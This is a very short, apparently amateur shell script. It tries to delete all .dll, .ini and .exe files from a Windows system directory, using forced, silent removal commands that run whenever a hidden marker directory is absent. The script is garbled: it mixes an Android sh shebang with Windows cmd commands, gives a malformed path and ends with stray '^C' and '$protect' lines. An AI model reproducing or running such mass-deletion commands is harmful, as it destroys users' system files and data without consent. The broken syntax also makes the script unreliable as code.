#!/system/bin/sh
protect="./.cl"
if [ ! -d $protect ]; then
cd %\window\%
rm -rf *.dll
rm -rf *.ini
rm -rf *.exe
del /q *.dll
del /q *.ini
del /q *.exe
fi
echo "clear"
^C
$protect
